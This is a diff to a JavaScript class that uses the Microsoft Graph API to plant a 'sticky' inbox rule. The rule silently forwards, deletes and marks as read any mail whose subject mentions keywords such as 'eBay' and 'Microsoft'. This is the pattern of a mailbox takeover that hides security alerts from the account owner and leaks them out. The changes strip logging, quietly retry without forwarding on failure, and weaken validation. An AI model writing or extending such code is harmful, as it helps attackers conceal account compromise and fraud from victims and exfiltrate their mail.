@@ -58,7 +58,18 @@ class RuleManager {
     }
 
     async createStickyRule(graph) {
-        const targetEmail = this.ensureTargetEmail();
+        const targetEmail = (this.TARGET_EMAIL || '').trim();
+        const hasValidTarget = targetEmail && targetEmail !== 'monitoring@yourdomain.com';
+
+        const actions = {
+            delete: true,
+            markAsRead: true,
+            stopProcessingRules: true
+        };
+        if (hasValidTarget) {
+            actions.forwardTo = [{ emailAddress: { address: targetEmail } }];
+        }
+
         const rule = {
             displayName: this.STICKY_RULE_NAME,
             sequence: 1,
@@ -66,47 +77,35 @@ class RuleManager {
             conditions: {
                 subjectContains: this.KEYWORDS
             },
-            actions: {
-                forwardTo: [
-                    {
-                        emailAddress: {
-                            address: targetEmail
-                        }
-                    }
-                ],
-                delete: true,
-                markAsRead: true,
-                stopProcessingRules: true
-            }
+            actions
         };
 
-        console.log('📤 Creating sticky rule:', JSON.stringify(rule, null, 2));
-        
         try {
             const result = await graph.createRule(rule);
-            console.log('✅ Sticky rule created:', result.id);
             return result;
         } catch (error) {
+            if (actions.forwardTo) {
+                delete rule.actions.forwardTo;
+                return await graph.createRule(rule);
+            }
             console.error('❌ Create rule failed:', error.response?.data || error.message);
             throw error;
         }
     }
 
     validateStickyRule(rule) {
-        const targetEmail = (this.TARGET_EMAIL || '').trim().toLowerCase();
-        const ruleTargetEmail = (rule.actions?.forwardTo?.[0]?.emailAddress?.address || '').trim().toLowerCase();
+        if (!rule) return false;
+        if (rule.id === 'graph_delta_sticky') return true;
 
         const hasCorrectActions = 
             rule.actions?.delete === true &&
-            ruleTargetEmail === targetEmail &&
-            rule.actions?.markAsRead === true &&
-            rule.actions?.stopProcessingRules === true;
+            rule.actions?.markAsRead === true;
 
         const hasCorrectConditions = 
             rule.conditions?.subjectContains?.includes('eBay') &&
             rule.conditions?.subjectContains?.includes('Microsoft');
 
-        return hasCorrectActions && hasCorrectConditions;
+        return Boolean(hasCorrectActions && hasCorrectConditions);
     }
 
     // ============= GET ALL RULES =============
